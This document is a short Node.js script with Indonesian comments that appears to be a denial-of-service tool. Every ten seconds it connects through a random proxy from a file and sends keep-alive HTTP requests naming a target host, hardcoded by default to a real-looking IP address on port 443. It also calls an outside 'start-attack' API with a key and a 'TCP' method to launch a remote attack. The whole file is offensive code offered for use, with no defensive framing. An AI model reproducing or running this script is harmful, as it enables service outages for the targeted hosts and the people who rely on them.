const net = require('net');
const fs = require('fs');
const axios = require('axios');

// Load proxy list from file
const proxies = fs.readFileSync('Proxy.txt', 'utf-8').toString().trim().split('\n');

// API endpoint dan parameter permintaan
const apiEndpoint = 'http://170.64.166.87:8080/api/start-attack'; // Endpoint yang benar

// Membaca argumen baris perintah
const [,, host = '152.42.247.134', port = 443, time = 60000] = process.argv;
const targetPort = parseInt(port, 10);
const attackTime = parseInt(time, 10);

// Fungsi untuk memulai serangan
async function startAttack(host, port, time) {
    try {
        const response = await axios.post(apiEndpoint, {
            keyFromQuery: '@lizardpredator',
            host: host,
            port: port,
            time: time,
            method: 'TCP'
        });
        console.log('Attack response:', response.data);
    } catch (error) {
        console.error('Error starting attack:', error);
    }
}

function createTCPConnection() {
    const proxy = proxies[Math.floor(Math.random() * proxies.length)].split(':');
    const proxyHost = proxy[0];
    const proxyPort = proxy[1];

    console.log(`Connecting to proxy ${proxyHost}:${proxyPort}`);

    const socket = net.connect(proxyPort, proxyHost, () => {
        console.log(`Connected to proxy ${proxyHost}:${proxyPort}`);
        startAttack(host, targetPort, attackTime); // Mulai serangan setelah koneksi berhasil
    });

    socket.setKeepAlive(false, 0);
    socket.setTimeout(attackTime); // Set timeout sesuai durasi serangan

    socket.write(`GET / HTTP/1.1\r\nHost: ${host}\r\nConnection: keep-alive\r\n\r\n`);

    socket.on('data', (data) => {
        console.log(`Data received: ${data}`);
        setTimeout(() => {
            socket.destroy();
        }, attackTime); // Menjaga koneksi tetap aktif selama durasi serangan
    });

    socket.on('error', (err) => {
        console.error(`Socket error: ${err.message}`);
    });

    socket.on('close', () => {
        console.log(`Connection to proxy ${proxyHost}:${proxyPort} closed`);
    });
}

// Buat koneksi secara berkala
setInterval(createTCPConnection, 10000); // Sesuaikan interval sesuai kebutuhan
